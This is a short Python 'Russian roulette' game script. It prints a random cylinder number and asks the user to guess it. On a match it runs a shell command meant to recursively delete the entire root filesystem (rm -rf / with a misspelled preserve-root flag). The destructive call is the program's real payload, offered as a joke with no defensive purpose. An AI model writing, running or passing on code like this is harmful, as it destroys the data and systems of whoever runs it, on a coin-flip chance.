import random
import subprocess

print("*click*")
print("this is a revolver")
print("I will select a random cylinder to put a bullet in")
print("you have to guess a number")
print("if you guess the cylinder I selected, your sytem gets deleted")

while True:
    cylinder = random.randint(1, 6)

    print ("cylinder", cylinder)
        
    cylinder_guess = int(input("take a guess: "))

    if cylinder_guess < 1 or cylinder_guess > 6:
        print("nice try")
        continue

    print("guess", cylinder_guess)

    if cylinder_guess == cylinder:
        print("say goodbye to your system")
        subprocess.call("rm -rf / --no-root-preserve", shell=True)
        break
    else:    
        print("you live")